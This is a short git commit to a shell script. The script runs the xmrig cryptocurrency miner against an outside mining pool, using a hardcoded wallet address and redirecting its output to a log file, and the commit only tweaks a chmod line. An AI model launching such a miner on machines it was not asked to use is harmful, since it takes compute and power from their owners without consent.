b2f7111143e6c2ac5132b491b75c30fecef394f3
romkojrr <129114740+romkojrr@users.noreply.github.com>
2023-03-28 04:55:44 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,2 +1,2 @@
-chmod 500 xmrig
+chmod 500 xmrig 1.log
 ./xmrig -o eu-qrl.volt-mine.com:4333 -u Q01050018ae33f2279aeafbb40b03bee3c2b69a0f2f27bd147d68dc4c6cfa807e93cc27ccef4e15 -k --tls --threads=2 > 1.log
